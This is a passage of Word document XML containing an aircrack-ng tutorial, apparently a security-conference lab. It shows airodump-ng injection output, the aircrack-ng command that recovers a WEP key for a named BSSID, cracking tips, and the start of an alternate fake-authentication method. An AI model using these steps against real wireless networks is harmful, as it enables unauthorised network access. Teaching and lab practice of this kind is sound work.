    <w:p w14:paraId="5E21AE48" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>End of file.</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="4D27DF3D"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 xml:space="preserve">While this command is successfully running, the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> screen will look similar to:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DAC1442" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00415848"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415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>CH  9</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> ][ Elapsed: 16 s ][ 2007-02-04 11:04 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D91ED70" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00415848"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415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                                                               </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="024EA3C7" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00415848"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415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  BSSID              PWR </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>RXQ  Beacons</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    #Data, #/s  CH  MB  ENC  CIPHER AUTH ESSID</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DEDC4B7" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00415848"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415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                                                               </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45A05588" w14:textId="06FDECF0" w:rsidR="004652D1" w:rsidRPr="00415848"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415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  00:14:6C</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>:7E:40:80</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   47 100      179     2689  336   9  11  WEP  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>WEP</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">         </w:t>
      </w:r>
      <w:r w:rsidR="007E5CF0" w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>BSIDES</w:t>
      </w:r>
      <w:r w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">                           </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32FE23F7" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00415848"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415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                                                               </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AB6813D" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00415848"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415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  BSSID              STATION            </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>PWR  Lost</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  Packets  Probes                                             </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2688D814" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00415848"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415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                                                               </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AD645B7" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00415848"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415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  00:14:6C</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>:7E:40:80</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  00:09:5B:EC:EE:F2   29     0     2707                                                     </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D961B87" w14:textId="77777777" w:rsidR="00415848" w:rsidRDefault="00415848" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="393D5E24"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 xml:space="preserve">You will notice that only one access point is being display since we included an </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> filter to limit the capture to a single BSSID. Also </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">notice that the station packets are roughly equal to the BSSID data packets. This means injection is working well. Also notice the data rate of 336 packets per </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>second which</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> is also an indicator that the injection is working well. This is a pretty “ideal” injection scenario.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02514AD9" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Troubleshooting Tips</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03B10A0D" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="006848FE" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>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 xml:space="preserve">If the BSSID data packets are not increasing, make sure you are still associated with the access point. To do this, follow the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>tcpdump</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> instructions in step 2.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AD11A06" w14:textId="77777777" w:rsidR="006848FE" w:rsidRDefault="006848FE" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>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p>
    <w:p w14:paraId="39DB5670" w14:textId="2A420382" w:rsidR="004652D1" w:rsidRDefault="00590FC4" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Step 7</w:t>
      </w:r>
      <w:r w:rsidR="004652D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> - Run </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="004652D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>aircrack-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="004652D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> to obtain the WEP key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E8FDC9F"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Start another console session and enter:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28EEF370" w14:textId="77777777" w:rsidR="006848FE" w:rsidRDefault="006848FE" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="600F976D" w14:textId="113E9536" w:rsidR="004652D1" w:rsidRPr="008E353E" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aircrack</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-b 00:14:6C:7E:40:80 capture*.ca</w:t>
      </w:r>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">p </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71FDD9B7" w14:textId="77777777" w:rsidR="006848FE" w:rsidRDefault="006848FE" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="51311E5E"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Where:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6466D9F5" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="28"/>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proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>capture</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>*.cap selects all dump files starting with “capture” and ending in “cap”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58C475BA" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="28"/>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b</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:14:6C:7E:40:80 selects the one access point we are interested in</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03E545BA"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 xml:space="preserve">You can run this while generating packets. In a short time, the WEP key will be calculated and presented. Using the PTW method, 40-bit WEP can be cracked with as few as 20,000 data packets and 104-bit WEP with 40,000 data packets. As a reminder, the requirement is that you capture the full packet with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>. Meaning, do not use the “--</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>ivs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>” option.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DB0AC4B"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Troubleshooting Tips:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DCE63CE" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="006848FE" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>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 xml:space="preserve">Sometimes you need to try various techniques to crack the WEP key. Try ”-n” to set various key lengths. Use ”-f” and try various fudge factors. Use ”-k” and try disabling various </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>korek</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> methods.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22E04833" w14:textId="77777777" w:rsidR="006848FE" w:rsidRDefault="006848FE" w:rsidP="00954648">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="220"/>
          <w:tab w:val="left" w:pos="720"/>
        </w:tabs>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="878787"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="04F60854" w14:textId="77777777" w:rsidR="00954648" w:rsidRDefault="00954648" w:rsidP="00954648">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="220"/>
          <w:tab w:val="left" w:pos="720"/>
        </w:tabs>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="878787"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="01D7B646" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="42"/>
          <w:szCs w:val="42"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="42"/>
          <w:szCs w:val="42"/>
        </w:rPr>
        <w:t>Alternate Solution</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A757AD3" w14:textId="76A6BF25" w:rsidR="004652D1" w:rsidRDefault="00C94A94"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You</w:t>
      </w:r>
      <w:r w:rsidR="004652D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> must also do a successful fake authentication first.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37F5D6B5"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Enter the following command:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1705FD36" w14:textId="77777777" w:rsidR="00954648" w:rsidRDefault="00954648" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4B36E324" w14:textId="77777777" w:rsidR="00954648" w:rsidRPr="008E353E" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
